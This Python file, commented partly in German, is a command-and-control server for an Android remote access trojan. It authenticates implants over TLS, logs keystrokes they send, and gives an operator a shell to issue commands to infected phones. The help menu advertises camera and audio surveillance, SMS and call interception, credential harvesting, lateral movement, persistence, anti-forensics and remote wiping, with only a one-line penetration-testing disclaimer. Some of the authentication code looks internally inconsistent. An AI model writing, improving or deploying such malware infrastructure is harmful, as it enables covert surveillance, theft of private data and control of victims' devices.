import asyncio
import json
import ssl
import base64
import os
import hmac
import hashlib
import secrets
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import logging

# Sicherheitskonfiguration
HOST = '0.0.0.0'
PORT = 8443  # Standard HTTPS Port
SSL_CERT_FILE = 'server.crt'  # Pfad zum SSL-Zertifikat
SSL_KEY_FILE = 'server.key'   # Pfad zum privaten Schlüssel

# Globale Variablen
clients = {}  # {client_id: ClientSession}
active_challenges = {}  # {challenge: timestamp}
client_secrets = {}  # {client_id: shared_secret} - Secure storage needed

# Generate or load persistent master key
def get_or_create_master_key():
    key_file = 'master.key'
    if os.path.exists(key_file):
        with open(key_file, 'rb') as f:
            return f.read().hex()
    else:
        # Generate strong master key
        key = secrets.token_bytes(32)
        with open(key_file, 'wb') as f:
            f.write(key)
        os.chmod(key_file, 0o600)  # Restrict file permissions
        return key.hex()

master_key = get_or_create_master_key()

# Logging-Konfiguration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)

def print_log(message):
    """Gibt eine Log-Nachricht mit Zeitstempel aus."""
    logging.info(message)

class ClientSession:
    """Repräsentiert eine authentifizierte Client-Session"""
    def __init__(self, client_id, reader, writer, encryption_key=None):
        self.client_id = client_id
        self.reader = reader
        self.writer = writer
        self.encryption_key = encryption_key
        self.authenticated = False
        self.last_heartbeat = datetime.now()
        self.device_info = {}
        
    def is_expired(self, timeout_minutes=10):
        """Prüft ob die Session abgelaufen ist"""
        return datetime.now() - self.last_heartbeat > timedelta(minutes=timeout_minutes)
        
    def update_heartbeat(self):
        """Aktualisiert den Heartbeat-Timestamp"""
        self.last_heartbeat = datetime.now()

class CryptoManager:
    """Verschlüsselungsmanager für Server-Client-Kommunikation"""
    
    @staticmethod
    def generate_key():
        """Generiert einen neuen AES-256-Schlüssel"""
        return secrets.token_bytes(32)
    
    @staticmethod
    def encrypt_data(data: str, key: bytes) -> str:
        """Verschlüsselt Daten mit AES-GCM"""
        try:
            # Generiere zufälligen IV
            iv = secrets.token_bytes(12)  # 96-bit IV für GCM
            
            # Erstelle Cipher
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            
            # Verschlüssele Daten
            ciphertext = encryptor.update(data.encode('utf-8')) + encryptor.finalize()
            
            # Kombiniere IV + Ciphertext + Tag
            encrypted_data = iv + ciphertext + encryptor.tag
            
            # Base64-Kodierung für Übertragung
            return base64.b64encode(encrypted_data).decode('utf-8')
            
        except Exception as e:
            logging.error(f"Verschlüsselung fehlgeschlagen: {e}")
            raise
    
    @staticmethod
    def decrypt_data(encrypted_data: str, key: bytes) -> str:
        """Entschlüsselt Daten mit AES-GCM"""
        try:
            # Base64-Dekodierung
            data = base64.b64decode(encrypted_data.encode('utf-8'))
            
            # Extrahiere Komponenten
            iv = data[:12]  # 96-bit IV
            tag = data[-16:]  # 128-bit Tag
            ciphertext = data[12:-16]
            
            # Erstelle Cipher
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            
            # Entschlüssele Daten
            plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            return plaintext.decode('utf-8')
            
        except Exception as e:
            logging.error(f"Entschlüsselung fehlgeschlagen: {e}")
            raise

class AuthManager:
    """Authentifizierungsmanager für sichere Client-Verbindungen"""
    
    @staticmethod
    def generate_challenge():
        """Generiert eine neue Challenge für Authentifizierung"""
        challenge = secrets.token_hex(32)
        server_nonce = secrets.token_hex(16)
        timestamp = datetime.now()
        
        active_challenges[challenge] = timestamp
        
        return {
            "challenge": challenge,
            "server_nonce": server_nonce,
            "timestamp": timestamp.timestamp()
        }
    
    @staticmethod
    def verify_challenge_response(challenge, client_nonce, hmac_response, client_id):
        """Verifiziert die Challenge-Response vom Client"""
        try:
            # Prüfe Challenge-Gültigkeit
            if challenge not in active_challenges:
                logging.warning(f"Unbekannte Challenge von Client {client_id}")
                return False
            
            # Prüfe Challenge-Timeout (5 Minuten)
            if datetime.now() - active_challenges[challenge] > timedelta(minutes=5):
                del active_challenges[challenge]
                logging.warning(f"Challenge-Timeout für Client {client_id}")
                return False
            
            # Erstelle erwarteten HMAC mit Nonce-Validierung
            shared_secret = AuthManager.get_shared_secret(client_id)
            challenge_data = active_challenges[challenge]
            
            # Include server nonce and timestamp for stronger validation
            server_nonce = secrets.token_hex(16)
            timestamp = str(int(challenge_data.timestamp()))
            
            combined_data = challenge + timestamp + client_nonce + server_nonce + client_id
            expected_hmac = hmac.new(
                shared_secret.encode('utf-8'),
                combined_data.encode('utf-8'),
                hashlib.sha256
            ).hexdigest()
            
            # Store server nonce for client validation
            active_challenges[challenge + "_server_nonce"] = server_nonce
            
            # Vergleiche HMACs (timing-sicher)
            is_valid = hmac.compare_digest(expected_hmac, hmac_response)
            
            if is_valid:
                del active_challenges[challenge]
                logging.info(f"Client {client_id} erfolgreich authentifiziert")
            else:
                logging.warning(f"HMAC-Verifikation fehlgeschlagen für Client {client_id}")
            
            return is_valid
            
        except Exception as e:
            logging.error(f"Fehler bei Challenge-Verifikation: {e}")
            return False
    
    @staticmethod
    def get_shared_secret(client_id):
        """Gibt das geteilte Geheimnis für einen Client zurück"""
        # Check if client has registered shared secret
        if client_id in client_secrets:
            return client_secrets[client_id]
        
        # Generate strong shared secret for new client
        shared_secret = secrets.token_hex(32) + client_id + secrets.token_hex(32)
        # Hash it for additional security
        secret_hash = hashlib.sha256(shared_secret.encode('utf-8')).hexdigest()
        client_secrets[client_id] = secret_hash
        
        # In production, store this in encrypted database
        logging.info(f"Generated strong shared secret for client {client_id}")
        return secret_hash
    
    @staticmethod
    def generate_auth_token(client_id):
        """Generiert ein Authentifizierungstoken für den Client"""
        payload = {
            "client_id": client_id,
            "timestamp": datetime.now().timestamp(),
            "nonce": secrets.token_hex(16)
        }
        
        token_data = json.dumps(payload)
        token_hmac = hmac.new(
            master_key.encode('utf-8'),
            token_data.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        
        return base64.b64encode(f"{token_data}.{token_hmac}".encode('utf-8')).decode('utf-8')
    
    @staticmethod
    def verify_auth_token(token):
        """Verifiziert ein Authentifizierungstoken"""
        try:
            decoded_token = base64.b64decode(token.encode('utf-8')).decode('utf-8')
            token_data, token_hmac = decoded_token.rsplit('.', 1)
            
            # Verifikation des HMAC
            expected_hmac = hmac.new(
                master_key.encode('utf-8'),
                token_data.encode('utf-8'),
                hashlib.sha256
            ).hexdigest()
            
            if not hmac.compare_digest(expected_hmac, token_hmac):
                return None
            
            payload = json.loads(token_data)
            
            # Token-Gültigkeitsdauer prüfen (24 Stunden)
            token_timestamp = datetime.fromtimestamp(payload['timestamp'])
            if datetime.now() - token_timestamp > timedelta(hours=24):
                return None
            
            return payload['client_id']
            
        except Exception as e:
            logging.error(f"Token-Verifikation fehlgeschlagen: {e}")
            return None

async def send_command(writer, command_data):
    """Sendet einen JSON-kodierten Befehl an den Client."""
    message = json.dumps(command_data) + '\\n'
    writer.write(message.encode('utf-8'))
    await writer.drain()

async def send_file(writer, file_path):
    """Sendet eine Datei an den Client."""
    try:
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(8192)
                if not chunk:
                    break
                # Dateidaten senden (vereinfacht)
                command = {"command": "upload", "file_data": base64.b64encode(chunk).decode()}
                await send_command(writer, command)
    except Exception as e:
        print_log(f"Fehler beim Senden der Datei: {e}")

async def handle_client(reader, writer):
    """Behandelt eingehende Client-Verbindungen mit Authentifizierung und Verschlüsselung"""
    client_session = None
    addr = writer.get_extra_info('peername')
    print_log(f"Neue sichere Verbindung von {addr}")

    try:
        # Warte auf Authentifizierungsanfrage mit Timeout
        try:
            auth_data = await asyncio.wait_for(reader.readline(), timeout=30.0)
        except asyncio.TimeoutError:
            print_log(f"Authentifizierung-Timeout für {addr}")
            return

        if not auth_data:
            print_log(f"Keine Authentifizierungsdaten von {addr} erhalten")
            return

        # Entschlüssele Authentifizierungsanfrage mit Fehlerbehandlung
        try:
            # Erste Nachricht sollte unverschlüsselt sein für Key-Exchange
            auth_request = json.loads(auth_data.decode('utf-8'))
        except (json.JSONDecodeError, UnicodeDecodeError) as e:
            print_log(f"Ungültige Authentifizierungsanfrage von {addr}: {e}")
            return
        except Exception as e:
            print_log(f"Unerwarteter Fehler beim Parsen der Authentifizierungsanfrage von {addr}: {e}")
            return

        # Validiere Authentifizierungsanfrage
        if not isinstance(auth_request, dict):
            print_log(f"Authentifizierungsanfrage ist kein gültiges JSON-Objekt von {addr}")
            return

        if auth_request.get('type') != 'auth_request':
            print_log(f"Unerwartete Nachricht von {addr}: {auth_request.get('type', 'unknown')}")
            return

        client_id = auth_request.get('client_id')
        if not client_id or not isinstance(client_id, str):
            print_log(f"Ungültige oder fehlende Client-ID von {addr}")
            return

        # Generiere Challenge mit zusätzlicher Sicherheit
        challenge_data = AuthManager.generate_challenge()
        # Add client-specific entropy
        challenge_data["client_entropy"] = hashlib.sha256(
            (client_id + str(datetime.now().timestamp())).encode('utf-8')
        ).hexdigest()[:16]
        
        challenge_response = {
            "type": "auth_challenge",
            **challenge_data
        }

        # Sende Challenge (verschlüsselt mit temporärem Schlüssel)
        temp_key = CryptoManager.generate_key()
        challenge_response["temp_key"] = base64.b64encode(temp_key).decode('utf-8')
        await send_encrypted_message(writer, challenge_response, temp_key)

        # Warte auf Challenge-Response
        response_data = await asyncio.wait_for(reader.readline(), timeout=30.0)
        if not response_data:
            print_log(f"Keine Challenge-Response von Client {client_id}")
            return

        try:
            challenge_response = json.loads(response_data.decode('utf-8'))
        except json.JSONDecodeError:
            print_log(f"Ungültige Challenge-Response von Client {client_id}")
            return

        # Verifiziere Challenge-Response
        challenge = challenge_response.get('challenge')
        client_nonce = challenge_response.get('client_nonce')
        hmac_response = challenge_response.get('hmac')

        if not AuthManager.verify_challenge_response(challenge, client_nonce, hmac_response, client_id):
            auth_result = {"type": "auth_result", "status": "failed", "error": "Authentication failed"}
            await send_encrypted_message(writer, auth_result)
            print_log(f"Authentifizierung fehlgeschlagen für Client {client_id}")
            return

        # Authentifizierung erfolgreich - generiere Token und Schlüssel
        auth_token = AuthManager.generate_auth_token(client_id)
        encryption_key = CryptoManager.generate_key()

        # Erstelle Client-Session
        client_session = ClientSession(client_id, reader, writer, encryption_key)
        client_session.authenticated = True
        clients[client_id] = client_session

        # Sende Authentifizierungsergebnis (ohne Klartext-Schlüssel)
        # Verschlüssele den Encryption Key mit dem geteilten Geheimnis
        shared_secret = AuthManager.get_shared_secret(client_id)
        encrypted_key = CryptoManager.encrypt_data(
            base64.b64encode(encryption_key).decode('utf-8'),
            shared_secret.encode('utf-8')[:32]  # Use first 32 chars as key
        )
        
        auth_result = {
            "type": "auth_result",
            "status": "success",
            "auth_token": auth_token,
            "encrypted_encryption_key": encrypted_key
        }
        await send_encrypted_message(writer, auth_result, temp_key)

        print_log(f"Client {client_id} erfolgreich authentifiziert und verbunden")

        # Starte Message-Handler für authentifizierten Client
        await handle_authenticated_client(client_session)

    except asyncio.TimeoutError:
        print_log(f"Authentifizierung-Timeout für {addr}")
    except (ConnectionResetError, BrokenPipeError) as e:
        print_log(f"Verbindungsfehler während Authentifizierung mit {addr}: {e}")
    except Exception as e:
        print_log(f"Unerwarteter Fehler bei Client-Behandlung: {e}")
        logging.exception("Detailed error:")
    finally:
        if client_session and client_session.client_id in clients:
            del clients[client_session.client_id]
        writer.close()
        await writer.wait_closed()
        print_log(f"Verbindung von {addr} geschlossen")

async def handle_authenticated_client(session: ClientSession):
    """Behandelt Nachrichten von authentifizierten Clients"""
    try:
        while True:
            # Empfange verschlüsselte Nachricht
            encrypted_data = await session.reader.readline()
            if not encrypted_data:
                break
            
            try:
                # Entschlüssele Nachricht
                decrypted_data = CryptoManager.decrypt_data(
                    encrypted_data.decode('utf-8').strip(),
                    session.encryption_key
                )
                message = json.loads(decrypted_data)

                # Verarbeite Nachricht basierend auf Typ
                message_type = message.get("type", "response")
                
                if message_type == "heartbeat":
                    session.update_heartbeat()
                    print_log(f"Heartbeat von Client {session.client_id} erhalten")
                elif message_type == "log":
                    await handle_log_message(session, message)
                elif message_type == "response":
                    await handle_response_message(session, message)
                else:
                    print_log(f"Unbekannter Nachrichtentyp von {session.client_id}: {message_type}")

            except json.JSONDecodeError:
                print_log(f"Ungültige JSON-Daten von Client {session.client_id}")
            except Exception as e:
                print_log(f"Fehler beim Verarbeiten der Nachricht von {session.client_id}: {e}")

    except (ConnectionResetError, BrokenPipeError):
        print_log(f"Verbindung zu Client {session.client_id} unterbrochen")
    except Exception as e:
        print_log(f"Unerwarteter Fehler bei Client {session.client_id}: {e}")

async def handle_log_message(session: ClientSession, message):
    """Behandelt Log-Nachrichten vom Client"""
    log_data = message.get("data", {})
    timestamp = log_data.get('timestamp', 'N/A')
    event_type = log_data.get('event_type', 'N/A')
    content = log_data.get('content', 'N/A')
    
    print_log(f"Keylog von {session.client_id}: [{timestamp}] {event_type} - {content}")
    
    # Hier könnten die Logs in eine Datenbank gespeichert werden
    # save_to_database(session.client_id, log_data)

async def handle_response_message(session: ClientSession, message):
    """Behandelt Response-Nachrichten vom Client"""
    print_log(f"Response von {session.client_id}: {message}")

async def send_encrypted_message(writer, message_data, encryption_key=None):
    """Sendet eine verschlüsselte Nachricht an den Client"""
    try:
        if writer is None:
            logging.error("Writer ist None - kann Nachricht nicht senden")
            return False

        # Validiere Eingabedaten
        if message_data is None:
            logging.error("Message data ist None")
            return False

        # Konvertiere zu JSON
        try:
            message_json = json.dumps(message_data)
        except (TypeError, ValueError) as e:
            logging.error(f"Fehler beim Konvertieren der Nachricht zu JSON: {e}")
            return False

        try:
            if encryption_key:
                # Verschlüssele Nachricht
                encrypted_message = CryptoManager.encrypt_data(message_json, encryption_key)
                writer.write(f"{encrypted_message}\n".encode('utf-8'))
            else:
                # Unverschlüsselte Nachricht (nur für Auth-Phase)
                writer.write(f"{message_json}\n".encode('utf-8'))

            await writer.drain()
            return True

        except (BrokenPipeError, ConnectionResetError) as e:
            logging.warning(f"Verbindungsfehler beim Senden der Nachricht: {e}")
            return False
        except Exception as e:
            logging.error(f"Unerwarteter Fehler beim Senden der Nachricht: {e}")
            return False

    except Exception as e:
        logging.error(f"Fehler beim Senden der verschlüsselten Nachricht: {e}")
        return False

async def send_command_to_client(client_id, command_data):
    """Sendet einen verschlüsselten Befehl an einen spezifischen Client"""
    try:
        # Validiere Eingabeparameter
        if not client_id or not isinstance(client_id, str):
            print_log("Ungültige Client-ID")
            return False

        if not command_data or not isinstance(command_data, dict):
            print_log("Ungültige Befehlsdaten")
            return False

        if client_id not in clients:
            print_log(f"Client {client_id} nicht verbunden")
            return False

        session = clients[client_id]
        if not session:
            print_log(f"Client-Session {client_id} ist None")
            return False

        if not session.authenticated:
            print_log(f"Client {client_id} nicht authentifiziert")
            return False

        if session.writer is None:
            print_log(f"Writer für Client {client_id} ist None")
            return False

        # Sende Befehl mit verbesserter Fehlerbehandlung
        success = await send_encrypted_message(session.writer, command_data, session.encryption_key)
        if success:
            print_log(f"Befehl an Client {client_id} gesendet: {command_data.get('command', 'unknown')}")
            return True
        else:
            print_log(f"Fehler beim Senden des Befehls an {client_id}")
            return False

    except Exception as e:
        print_log(f"Unerwarteter Fehler beim Senden des Befehls an {client_id}: {e}")
        logging.exception("Detailed error in send_command_to_client:")
        return False

async def command_shell():
    """Advanced Real-Time Operational Control Interface"""
    print("=== ADVANCED RAT CONTROL CENTER ===")
    print("🎯 Real-Time Target Monitoring and Control Interface")
    print("📡 Enhanced C2 with Advanced Attack Capabilities")
    print("")
    print("Available Command Categories:")
    print("  🔍 SURVEILLANCE: surveillance-start, surveillance-stop, get-surveillance-data")
    print("  🌐 LATERAL: lateral-start, lateral-stop, network-scan, exploit-device")
    print("  💾 PERSISTENCE: persistence-status, create-backup, test-survival")
    print("  📊 INTELLIGENCE: behavioral-profile, target-analysis, risk-assessment")
    print("  🎮 CONTROL: ls, screenshot, get-location, send-sms, install-apk")
    print("  ⚙️  SYSTEM: list, status, help, exit")
    print("")
    print("🚨 Advanced Attack Functions Enabled - Use Responsibly")
    
    while True:
        try:
            if not clients:
                print("Keine Clients verbunden. Warten...")
                await asyncio.sleep(2)
                continue

            print("\n=== Verbundene authentifizierte Clients ===")
            client_list = list(clients.items())
            for i, (client_id, session) in enumerate(client_list, 1):
                status = "AKTIV" if not session.is_expired() else "INAKTIV"
                last_seen = session.last_heartbeat.strftime("%H:%M:%S")
                print(f"{i}. {client_id} - Status: {status} - Letzter Heartbeat: {last_seen}")

            client_choice_str = await asyncio.get_event_loop().run_in_executor(
                None, lambda: input("\nWählen Sie einen Client (Nummer), 'list' zum Aktualisieren oder 'exit': ")
            )

            if client_choice_str.lower() == 'list':
                continue
            elif client_choice_str.lower() == 'exit':
                print("Shell wird beendet...")
                break

            try:
                client_choice = int(client_choice_str) - 1
                if not 0 <= client_choice < len(client_list):
                    print("Ungültige Auswahl.")
                    continue
            except ValueError:
                print("Bitte geben Sie eine gültige Nummer ein.")
                continue

            target_client_id, target_session = client_list[client_choice]
            
            # Prüfe ob Client noch aktiv ist
            if target_session.is_expired():
                print(f"WARNUNG: Client {target_client_id} scheint inaktiv zu sein.")
                continue_anyway = await asyncio.get_event_loop().run_in_executor(
                    None, lambda: input("Trotzdem fortfahren? (y/N): ")
                )
                if continue_anyway.lower() != 'y':
                    continue

            command_str = await asyncio.get_event_loop().run_in_executor(
                None, lambda: input(f"Befehl für {target_client_id} >> ")
            )

            if not command_str.strip():
                continue

            # Parse Command
            parts = command_str.split()
            command_data = {
                "command": parts[0],
                "args": parts[1:] if len(parts) > 1 else [],
                "timestamp": datetime.now().timestamp(),
                "server_id": "c2_server_v2"
            }

            # Spezielle Befehle behandeln
            if command_data["command"] == "help":
                print_help()
                continue
            elif command_data["command"] == "exit":
                break

            # Sende verschlüsselten Befehl an Client
            success = await send_command_to_client(target_client_id, command_data)
            if success:
                print(f"✓ Befehl '{command_data['command']}' an {target_client_id} gesendet")
            else:
                print(f"✗ Fehler beim Senden des Befehls an {target_client_id}")

        except (ValueError, IndexError):
            print("Ungültige Eingabe. Verwenden Sie 'help' für Hilfe.")
        except KeyboardInterrupt:
            print("\nShell wird heruntergefahren...")
            break
        except Exception as e:
            print(f"Unerwarteter Fehler: {e}")
            logging.exception("Command shell error:")

def print_help():
    """Shows comprehensive help for all available attack commands"""
    help_text = """
=== ADVANCED RAT COMMAND REFERENCE ===

🔍 SURVEILLANCE OPERATIONS:
  surveillance-start           - Activate comprehensive surveillance (camera, audio, location)
  surveillance-stop            - Deactivate surveillance systems
  get-surveillance-data        - Retrieve collected surveillance intelligence
  behavioral-profile           - Generate target behavioral analysis
  target-analysis             - Comprehensive target profiling
  risk-assessment             - Evaluate target risk factors

🌐 LATERAL MOVEMENT & NETWORK EXPLOITATION:
  lateral-start               - Begin network reconnaissance and lateral movement
  lateral-stop                - Stop lateral movement operations
  network-scan                - Scan local network for devices
  exploit-device <ip>         - Attempt exploitation of target device
  harvest-credentials         - Extract credentials from target and network
  pivot-attack <target>       - Use compromised device as attack pivot

💾 PERSISTENCE & SURVIVAL:
  persistence-status          - Check all persistence mechanisms
  create-backup               - Create hidden backup for recovery
  test-survival               - Test survival against common defenses
  self-repair                 - Initiate self-repair and recovery
  advanced-hide               - Enhanced stealth and concealment

📊 INTELLIGENCE GATHERING:
  comprehensive-scan          - Full device and data exfiltration
  social-intelligence         - Extract social connections and patterns
  financial-intelligence      - Locate financial and payment data
  location-intelligence       - Detailed movement and location analysis
  communication-intelligence  - SMS, calls, and messaging analysis

🎮 DEVICE CONTROL:
  screenshot                  - Capture screen (stealth mode)
  camera-stream              - Live camera streaming (front/back)
  audio-record               - Environmental audio recording
  remote-shell               - Interactive shell access
  file-manager               - Advanced file operations
  app-control                - Install/uninstall/control applications

📱 COMMUNICATION HIJACKING:
  intercept-sms              - Monitor incoming/outgoing SMS
  intercept-calls            - Monitor call activity
  social-hijack              - Access social media accounts
  email-access               - Access email accounts
  messaging-control          - Control messaging applications

🔓 PRIVILEGE ESCALATION:
  root-exploit               - Attempt privilege escalation
  system-backdoor            - Install system-level backdoor
  firmware-modify            - Attempt firmware modification
  bootloader-access          - Access bootloader functionality

⚡ REAL-TIME OPERATIONS:
  live-monitor               - Real-time activity monitoring
  instant-response           - Immediate command execution
  emergency-wipe             - Remote data destruction
  lockdown-mode              - Activate operational security mode

🛡️ EVASION & ANTI-FORENSICS:
  anti-analysis              - Deploy anti-analysis countermeasures
  evidence-destruction       - Destroy forensic evidence
  log-manipulation           - Modify system logs
  timeline-obfuscation       - Obscure activity timeline

📡 COMMAND & CONTROL:
  c2-switch                  - Switch to backup C2 servers
  channel-encrypt            - Enhanced communication encryption
  steganography              - Hide communications in images/files
  covert-channel             - Establish covert communication channels

BASIC OPERATIONS:
  list                       - List connected clients with detailed status
  status                     - Show comprehensive system status
  help                       - Show this help information
  exit                       - Exit control interface

⚠️  WARNING: These are advanced attack capabilities for authorized
    penetration testing and security research only. Misuse is illegal.

📋 USAGE EXAMPLES:
  surveillance-start                    # Begin full surveillance
  lateral-start && network-scan         # Start lateral movement
  comprehensive-scan                    # Full intelligence gathering
  behavioral-profile                    # Generate target profile
  exploit-device 192.168.1.10         # Attack specific device
    """
    print(help_text)

async def cleanup_expired_sessions():
    """Bereinigt abgelaufene Client-Sessions"""
    while True:
        try:
            expired_clients = []
            for client_id, session in clients.items():
                if session.is_expired(timeout_minutes=15):  # 15 Minuten Timeout
                    expired_clients.append(client_id)
            
            for client_id in expired_clients:
                print_log(f"Entferne abgelaufene Session für Client {client_id}")
                session = clients.pop(client_id, None)
                if session:
                    try:
                        session.writer.close()
                        await session.writer.wait_closed()
                    except:
                        pass
            
            # Bereinige auch alte Challenges
            current_time = datetime.now()
            expired_challenges = [
                challenge for challenge, timestamp in active_challenges.items()
                if current_time - timestamp > timedelta(minutes=10)
            ]
            
            for challenge in expired_challenges:
                del active_challenges[challenge]
            
            await asyncio.sleep(300)  # Alle 5 Minuten bereinigen
            
        except Exception as e:
            logging.error(f"Fehler bei Session-Bereinigung: {e}")
            await asyncio.sleep(60)  # Bei Fehler 1 Minute warten

async def create_ssl_context():
    """Erstellt SSL-Kontext für sichere Verbindungen"""
    try:
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        
        # Lade Zertifikat und privaten Schlüssel
        if os.path.exists(SSL_CERT_FILE) and os.path.exists(SSL_KEY_FILE):
            ssl_context.load_cert_chain(SSL_CERT_FILE, SSL_KEY_FILE)
            print_log("SSL-Zertifikat und Schlüssel geladen")
        else:
            print_log("SSL-Zertifikatsdateien nicht gefunden - generiere sichere Zertifikate")
            if not generate_ssl_certificates():
                print_log("FEHLER: Kann SSL-Zertifikate nicht erstellen")
                return None
            # Load newly generated certificates
            ssl_context.load_cert_chain(SSL_CERT_FILE, SSL_KEY_FILE)
        
        # Sichere Cipher-Konfiguration
        ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
        ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
        
        return ssl_context
        
    except Exception as e:
        print_log(f"Fehler beim Erstellen des SSL-Kontexts: {e}")
        return None

async def start_server():
    """Startet den sicheren C2-Server"""
    try:
        # Erstelle SSL-Kontext
        ssl_context = await create_ssl_context()
        
        if ssl_context is None:
            print_log("FEHLER: Kann SSL-Kontext nicht erstellen. Server wird nicht gestartet.")
            print_log("Bitte erstellen Sie gültige SSL-Zertifikate oder passen Sie die Konfiguration an.")
            return
        
        # Starte Server mit SSL
        server = await asyncio.start_server(
            handle_client, 
            HOST, 
            PORT, 
            ssl=ssl_context
        )
        
        addr = server.sockets[0].getsockname()
        print_log(f"🔒 Sicherer C2-Server läuft auf https://{addr[0]}:{addr[1]}")
        print_log(f"📊 Master-Schlüssel: {master_key[:16]}...")
        print_log("✅ Server bereit für authentifizierte Client-Verbindungen")

        # Starte Shell und Cleanup-Tasks
        shell_task = asyncio.create_task(command_shell())
        cleanup_task = asyncio.create_task(cleanup_expired_sessions())
        
        print_log("🚀 Command-Shell gestartet")

        async with server:
            await server.serve_forever()
            
    except Exception as e:
        print_log(f"Kritischer Serverfehler: {e}")
        logging.exception("Server startup error:")

def generate_ssl_certificates():
    """Generiert starke selbstsignierte SSL-Zertifikate falls nicht vorhanden"""
    if not os.path.exists(SSL_CERT_FILE) or not os.path.exists(SSL_KEY_FILE):
        print("SSL-Zertifikate nicht gefunden. Generiere sichere selbstsignierte Zertifikate...")
        
        try:
            # Importiere zusätzliche Krypto-Module für Zertifikatsgenerierung
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            import ipaddress
            
            # Generiere starken privaten Schlüssel
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=4096,  # Strong key size
                backend=default_backend()
            )
            
            # Erstelle Zertifikat
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, u"DE"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"Deutschland"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, u"Stadt"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"C2-Server"),
                x509.NameAttribute(NameOID.COMMON_NAME, u"localhost"),
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.now()
            ).not_valid_after(
                datetime.now() + timedelta(days=365)
            ).add_extension(
                x509.SubjectAlternativeName([
                    x509.DNSName(u"localhost"),
                    x509.IPAddress(ipaddress.IPv4Address(u"127.0.0.1")),
                ]),
                critical=False,
            ).sign(private_key, hashes.SHA256(), default_backend())
            
            # Speichere Zertifikat
            with open(SSL_CERT_FILE, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            # Speichere privaten Schlüssel
            with open(SSL_KEY_FILE, "wb") as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            # Set secure file permissions
            os.chmod(SSL_CERT_FILE, 0o644)
            os.chmod(SSL_KEY_FILE, 0o600)  # Private key should be very restricted
            
            print(f"✅ Sichere SSL-Zertifikate erstellt: {SSL_CERT_FILE}, {SSL_KEY_FILE}")
            print("✅ Dateiberechtigungen auf sicheres Level gesetzt")
            return True
            
        except ImportError:
            print("❌ Kann SSL-Zertifikate nicht automatisch generieren.")
            print("Bitte installieren Sie 'cryptography' oder erstellen Sie Zertifikate manuell:")
            print("openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes")
            return False
        except Exception as e:
            print(f"❌ Fehler beim Generieren der SSL-Zertifikate: {e}")
            return False
    return True

if __name__ == "__main__":
    try:
        print("=== Sicherer Android RAT C2-Server v2.0 ===")
        print("🔐 Startvorgang mit erweiterten Sicherheitsfeatures...")
        
        # Generiere SSL-Zertifikate falls nötig
        generate_ssl_certificates()
        
        # Starte Server
        asyncio.run(start_server())
        
    except KeyboardInterrupt:
        print_log("\n🛑 Server wird heruntergefahren...")
        print_log("✅ Alle Verbindungen geschlossen")
    except Exception as e:
        print_log(f"❌ Kritischer Fehler: {e}")
        logging.exception("Main error:")
